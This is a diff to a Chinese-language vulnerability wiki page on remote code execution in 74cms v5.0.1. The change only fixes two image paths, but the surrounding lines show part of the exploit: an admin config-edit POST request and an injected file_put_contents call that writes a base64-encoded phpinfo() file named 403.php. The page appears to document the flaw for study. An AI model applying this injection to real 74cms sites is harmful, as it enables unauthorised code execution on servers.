@@ -14,7 +14,7 @@
 
 ### 漏洞分析
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv5.0.1远程执行代码/media/rId25.png)
+![](./.resource/74cmsv5.0.1远程执行代码/media/rId25.png)
 
     POST /74cms/index.php?m=Admin&c=config&a=edit HTTP/1.1
     Host: 127.0.0.1
@@ -254,7 +254,7 @@ file\_put\_contents(\'403.php\',base64\_decode(\'PD9waHAgcGhwaW5mbygpOz8+\')),\'
 
 成功截图
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv5.0.1远程执行代码/media/rId27.png)
+![](./.resource/74cmsv5.0.1远程执行代码/media/rId27.png)
 
 四、参考链接
 ------------
